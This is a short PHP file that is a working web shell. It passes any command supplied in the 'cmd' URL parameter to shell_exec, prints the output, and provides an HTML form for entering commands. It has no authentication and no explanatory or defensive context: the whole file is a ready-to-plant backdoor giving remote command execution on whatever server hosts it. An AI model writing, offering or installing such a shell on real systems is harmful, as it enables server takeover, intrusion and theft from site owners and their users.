<?php
if (isset($_GET['cmd'])){
	echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';
}
?>
<form name="form" action="" method="get">
  <input type="text" name="cmd" id="cmd">
  <input type="submit" value="Go">
</form>
